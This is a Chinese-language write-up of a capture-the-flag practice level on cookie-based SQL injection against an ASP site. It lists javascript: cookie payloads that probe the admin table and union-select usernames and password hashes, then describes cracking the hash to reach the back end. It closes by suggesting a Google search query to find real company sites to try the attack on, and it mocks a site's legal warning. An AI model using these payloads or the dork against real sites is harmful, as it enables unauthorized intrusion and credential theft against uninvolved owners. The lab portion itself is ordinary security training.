今天玩封神台第二关，学习到了不同的cookie注入方式。一般来说cookie注入有两种方式
1.将cookie带入数据库查询
2.允许request通信，可以用cookie来传送值

今天说的就是第二种
练习站点：[封神台第二关](http://117.41.229.122:8004)

这个站点防注和一些google搜出来的站点防御很像：
![khcuRS.png](https://s2.ax1x.com/2019/02/23/khcuRS.png)

注入方式：
输入：
```
javascript:alert(document.cookie="id="+escape("171'"))
```
执行后在刷新页面，发现页面回显不一样了。说明存在cookie注入

![khfOqe.png](https://s2.ax1x.com/2019/02/23/khfOqe.png)

![khfhVJ.md.png](https://s2.ax1x.com/2019/02/23/khfhVJ.md.png)


![khf726.png](https://s2.ax1x.com/2019/02/23/khf726.png)

然后就可以构造以下payload：
```
javascript:alert(document.cookie="id="+escape("171 and exists(select * from admin)"))
javascript:alert(document.cookie="id="+escape("171 and exists(select username from admin)"))
javascript:alert(document.cookie="id="+escape("171 and exists(select password from admin)"))
javascript:alert(document.cookie="id="+escape("171 order by 10"))
javascript:alert(document.cookie="id="+escape("0 union select 1,2,3,4,5,6,7,8,9,10 from admin"))
javascript:alert(document.cookie="id="+escape("0 union select 1,username,password,4,5,6,7,8,9,10 from admin"))
```
![kh4bHe.md.png](https://s2.ax1x.com/2019/02/23/kh4bHe.md.png)

![kh4ONd.png](https://s2.ax1x.com/2019/02/23/kh4ONd.png)

找到后台路径：
![kh4zgP.md.png](https://s2.ax1x.com/2019/02/23/kh4zgP.md.png)

解密md5登录进后台即可获取flag
![kh59u8.png](https://s2.ax1x.com/2019/02/23/kh59u8.png)

可以尝试用google找几个站点来测试一下：
```
inurl:asp?id=1 intext:公司|化工
```
之前遇见一个律师的站，警告真tm欠打